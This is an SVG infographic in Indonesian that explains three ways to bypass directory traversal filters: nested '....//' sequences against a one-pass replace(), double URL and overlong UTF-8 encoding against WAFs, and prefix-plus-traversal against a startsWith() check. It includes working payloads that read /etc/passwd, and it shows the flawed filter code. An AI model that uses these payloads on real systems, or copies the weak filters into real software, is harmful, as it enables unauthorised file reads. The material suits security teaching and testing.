<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" height="100%">
  <defs>
    <!-- Background Gradient -->
    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#090D16"/>
      <stop offset="50%" stop-color="#0F172A"/>
      <stop offset="100%" stop-color="#090D16"/>
    </linearGradient>

    <!-- Card Background Gradients -->
    <linearGradient id="cardGrad" x1="0%" y1="0%" x2="0%" y2="100%">
      <stop offset="0%" stop-color="#1E293B" stop-opacity="0.95"/>
      <stop offset="100%" stop-color="#0F172A" stop-opacity="0.95"/>
    </linearGradient>

    <!-- Glow Filters -->
    <filter id="glowCyan" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowAmber" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>
    <filter id="glowRose" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur stdDeviation="6" result="blur" />
      <feComposite in="SourceGraphic" in2="blur" operator="over" />
    </filter>

    <!-- Shadow -->
    <filter id="cardShadow" x="-10%" y="-10%" width="120%" height="125%">
      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000000" flood-opacity="0.5"/>
    </filter>

    <!-- Markers -->
    <marker id="arrowDown" markerWidth="8" markerHeight="8" refX="4" refY="4" orient="auto">
      <path d="M1,1 L4,6 L7,1 Z" fill="#64748B"/>
    </marker>
  </defs>

  <style>
    .title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 800; fill: #F8FAFC; }
    .subtitle { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 500; fill: #94A3B8; }
    .card-title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 700; }
    .code-text { font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 600; }
    .desc-text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 12px; fill: #CBD5E1; line-height: 1.4; }
    .item-text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 11.5px; fill: #E2E8F0; }
    .badge { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 10.5px; font-weight: 700; }
  </style>

  <!-- Background Base -->
  <rect width="1080" height="560" rx="16" fill="url(#bgGrad)"/>
  <rect width="1080" height="560" rx="16" fill="none" stroke="#334155" stroke-width="1.5" stroke-opacity="0.6"/>

  <!-- Grid Line Pattern -->
  <g opacity="0.06" stroke="#94A3B8" stroke-width="1">
    <line x1="0" y1="80" x2="1080" y2="80"/>
    <line x1="0" y1="160" x2="1080" y2="160"/>
    <line x1="0" y1="240" x2="1080" y2="240"/>
    <line x1="0" y1="320" x2="1080" y2="320"/>
    <line x1="0" y1="400" x2="1080" y2="400"/>
    <line x1="0" y1="480" x2="1080" y2="480"/>
    <line x1="180" y1="0" x2="180" y2="560"/>
    <line x1="360" y1="0" x2="360" y2="560"/>
    <line x1="540" y1="0" x2="540" y2="560"/>
    <line x1="720" y1="0" x2="720" y2="560"/>
    <line x1="900" y1="0" x2="900" y2="560"/>
  </g>

  <!-- Header Section -->
  <g transform="translate(48, 40)">
    <rect x="0" y="0" width="165" height="24" rx="12" fill="#38BDF8" fill-opacity="0.15" stroke="#38BDF8" stroke-width="1"/>
    <text x="82" y="16" text-anchor="middle" class="badge" fill="#38BDF8">FILTER BYPASS TRICKS</text>
    <text x="180" y="18" class="title" font-size="20">Directory Traversal: Teknik Bypassing Filter</text>
    <text x="0" y="42" class="subtitle" font-size="13">Trik menembus filter pemblokiran traversal menggunakan Nested Stripping, Double Encoding, &amp; Prefix Validation</text>
  </g>

  <!-- ==================== COLUMN 1: NESTED STRIPPING (....//) ==================== -->
  <g transform="translate(48, 115)" filter="url(#cardShadow)">
    <rect width="308" height="405" rx="14" fill="url(#cardGrad)" stroke="#38BDF8" stroke-width="1.5"/>
    
    <!-- Icon & Header -->
    <rect x="18" y="18" width="38" height="38" rx="8" fill="#0369A1" fill-opacity="0.2" stroke="#38BDF8" stroke-width="1.5"/>
    <path d="M26 37 H48 M38 27 L48 37 L38 47" stroke="#38BDF8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    
    <text x="66" y="34" class="card-title" font-size="15" fill="#38BDF8">1. Non-Recursive Strip</text>
    <text x="66" y="50" class="desc-text" font-size="11.5" fill="#94A3B8">Pola Nested Sequences (....//)</text>

    <line x1="18" y1="68" x2="290" y2="68" stroke="#334155" stroke-width="1"/>

    <!-- Vulnerable Filter Box -->
    <rect x="16" y="80" width="276" height="74" rx="8" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
    <text x="26" y="98" class="badge" fill="#FCA5A5">FILTER DI BACKEND (HANYA 1X):</text>
    <text x="26" y="118" class="code-text" fill="#CBD5E1">input = input.replace(/\.\.\//g, "");</text>
    <text x="26" y="136" class="desc-text" font-size="10.5" fill="#94A3B8">⚠️ Hanya menghapus "../" sekali saja</text>

    <!-- Exploit Diagram -->
    <rect x="16" y="164" width="276" height="150" rx="8" fill="#0F172A" stroke="#0284C7" stroke-width="1"/>
    <text x="26" y="184" class="badge" fill="#38BDF8">PAYLOAD &amp; PROSES REFORMS:</text>
    
    <rect x="24" y="194" width="260" height="26" rx="4" fill="#0C4A6E" stroke="#38BDF8" stroke-width="1" filter="url(#glowCyan)"/>
    <text x="32" y="211" class="code-text" fill="#E0F2FE">....//....//....//etc/passwd</text>
    
    <text x="26" y="240" class="desc-text" font-size="11">1. Pola: <tspan fill="#38BDF8" font-weight="700">..</tspan><tspan fill="#F43F5E" font-weight="700">../</tspan><tspan fill="#38BDF8" font-weight="700">/</tspan></text>
    <text x="26" y="258" class="desc-text" font-size="11">2. <tspan fill="#F43F5E" font-weight="700">../</tspan> di tengah dihapus oleh server</text>
    <text x="26" y="276" class="desc-text" font-size="11">3. Sisa karakter menyatu kembali:</text>
    
    <rect x="24" y="284" width="260" height="24" rx="4" fill="#1C1917" stroke="#38BDF8" stroke-width="1"/>
    <text x="32" y="300" class="code-text" fill="#34D399">=&gt; "../../../etc/passwd"</text>

    <!-- Bottom Result -->
    <rect x="16" y="324" width="276" height="66" rx="8" fill="#0284C7" fill-opacity="0.1" stroke="#0284C7" stroke-width="1"/>
    <text x="26" y="344" class="badge" fill="#7DD3FC">✓ HASIL FILTER TEMBUS:</text>
    <text x="26" y="362" class="desc-text" font-size="11">Sekuens traversal terbentuk kembali</text>
    <text x="26" y="378" class="desc-text" font-size="11">setelah proses stripping selesai.</text>
  </g>

  <!-- ==================== COLUMN 2: URL & DOUBLE ENCODING ==================== -->
  <g transform="translate(386, 115)" filter="url(#cardShadow)">
    <rect width="308" height="405" rx="14" fill="url(#cardGrad)" stroke="#F59E0B" stroke-width="1.5"/>
    
    <!-- Icon & Header -->
    <rect x="18" y="18" width="38" height="38" rx="8" fill="#B45309" fill-opacity="0.2" stroke="#F59E0B" stroke-width="1.5"/>
    <text x="37" y="42" text-anchor="middle" font-family="monospace" font-size="12" font-weight="900" fill="#FBBF24">%25</text>
    
    <text x="66" y="34" class="card-title" font-size="15" fill="#FBBF24">2. Double URL Encoding</text>
    <text x="66" y="50" class="desc-text" font-size="11.5" fill="#94A3B8">Bypass WAF / Multi-layer Decode</text>

    <line x1="18" y1="68" x2="290" y2="68" stroke="#334155" stroke-width="1"/>

    <!-- Encoding Matrix -->
    <rect x="16" y="80" width="276" height="88" rx="8" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
    <text x="26" y="98" class="badge" fill="#FDE047">TABEL ENCODING KARAKTER:</text>
    <text x="26" y="118" class="code-text" fill="#CBD5E1">. = <tspan fill="#F59E0B">%2e</tspan>  |  Double: <tspan fill="#F59E0B">%252e</tspan></text>
    <text x="26" y="136" class="code-text" fill="#CBD5E1">/ = <tspan fill="#F59E0B">%2f</tspan>  |  Double: <tspan fill="#F59E0B">%252f</tspan></text>
    <text x="26" y="154" class="code-text" fill="#CBD5E1">\ = <tspan fill="#F59E0B">%5c</tspan>  |  Double: <tspan fill="#F59E0B">%255c</tspan></text>

    <!-- Exploit Flow -->
    <rect x="16" y="178" width="276" height="136" rx="8" fill="#0F172A" stroke="#D97706" stroke-width="1"/>
    <text x="26" y="198" class="badge" fill="#FBBF24">DOUBLE ENCODE DEPLOYMENT:</text>
    
    <rect x="24" y="208" width="260" height="26" rx="4" fill="#451A03" stroke="#F59E0B" stroke-width="1" filter="url(#glowAmber)"/>
    <text x="32" y="225" class="code-text" fill="#FEF08A">%252e%252e%252fetc/passwd</text>

    <text x="26" y="254" class="desc-text" font-size="11">1. WAF Decode 1x → <tspan class="code-text" fill="#FDE047">%2e%2e%2f</tspan></text>
    <text x="26" y="270" class="desc-text" font-size="11">   (WAF tidak melihat dot ".")</text>
    <text x="26" y="288" class="desc-text" font-size="11">2. Backend Decode 2x → <tspan class="code-text" fill="#34D399">"../"</tspan></text>
    <text x="26" y="304" class="desc-text" font-size="11">   (Backend mengeksekusi traversal)</text>

    <!-- Bottom Result -->
    <rect x="16" y="324" width="276" height="66" rx="8" fill="#D97706" fill-opacity="0.1" stroke="#F59E0B" stroke-width="1"/>
    <text x="26" y="344" class="badge" fill="#FDE68A">✓ OVERLONG UTF-8 ALTERNATIF:</text>
    <text x="26" y="362" class="code-text" font-size="11" fill="#FEF08A">%c0%af  <tspan fill="#94A3B8">(Overlong '/')</tspan></text>
    <text x="26" y="378" class="code-text" font-size="11" fill="#FEF08A">%e0%80%af <tspan fill="#94A3B8">(3-byte Overlong '/')</tspan></text>
  </g>

  <!-- ==================== COLUMN 3: START OF PATH VALIDATION ==================== -->
  <g transform="translate(724, 115)" filter="url(#cardShadow)">
    <rect width="308" height="405" rx="14" fill="url(#cardGrad)" stroke="#F43F5E" stroke-width="1.5"/>
    
    <!-- Icon & Header -->
    <rect x="18" y="18" width="38" height="38" rx="8" fill="#9F1239" fill-opacity="0.2" stroke="#F43F5E" stroke-width="1.5"/>
    <path d="M26 37 H44 M34 29 L42 37 L34 45" stroke="#F43F5E" stroke-width="2" stroke-linecap="round"/>
    
    <text x="66" y="34" class="card-title" font-size="15" fill="#F43F5E">3. Start of Path Bypass</text>
    <text x="66" y="50" class="desc-text" font-size="11.5" fill="#94A3B8">Penyisipan Prefix Direktori</text>

    <line x1="18" y1="68" x2="290" y2="68" stroke="#334155" stroke-width="1"/>

    <!-- Required Prefix Filter -->
    <rect x="16" y="80" width="276" height="74" rx="8" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
    <text x="26" y="98" class="badge" fill="#FDA4AF">FILTER DI SERVER (VALIDASI AWAL):</text>
    <text x="26" y="118" class="code-text" fill="#CBD5E1">if (!path.startsWith("/var/images/"))</text>
    <text x="26" y="136" class="desc-text" font-size="10.5" fill="#FCA5A5">Wajib diawali dengan direktori dasar!</text>

    <!-- Exploit Diagram -->
    <rect x="16" y="164" width="276" height="150" rx="8" fill="#0F172A" stroke="#E11D48" stroke-width="1"/>
    <text x="26" y="184" class="badge" fill="#F43F5E">TRIK: PREFIX + TRAVERSE OUT:</text>
    
    <rect x="24" y="194" width="260" height="38" rx="4" fill="#4C0519" stroke="#F43F5E" stroke-width="1" filter="url(#glowRose)"/>
    <text x="30" y="210" class="code-text" font-size="10.5" fill="#FDA4AF">/var/images/<tspan fill="#34D399" font-weight="700">../../../etc/passwd</tspan></text>
    
    <text x="26" y="250" class="desc-text" font-size="11">1. Server cek prefix: <tspan fill="#34D399" font-weight="700">VALID ✓</tspan></text>
    <text x="26" y="268" class="desc-text" font-size="11">   (Diawali "/var/images/")</text>
    <text x="26" y="286" class="desc-text" font-size="11">2. Sekuens <tspan fill="#34D399" font-weight="700">"../../../"</tspan> langsung mundur</text>
    <text x="26" y="302" class="desc-text" font-size="11">   keluar menuju root OS (/etc/passwd)!</text>

    <!-- Bottom Result -->
    <rect x="16" y="324" width="276" height="66" rx="8" fill="#E11D48" fill-opacity="0.1" stroke="#F43F5E" stroke-width="1"/>
    <text x="26" y="344" class="badge" fill="#FECDD3">✓ HASIL: KONTROL TERKECOH</text>
    <text x="26" y="362" class="desc-text" font-size="11">Pemeriksaan startsWith() lolos tapi</text>
    <text x="26" y="378" class="desc-text" font-size="11">berkas target root tetap terbaca.</text>
  </g>

</svg>
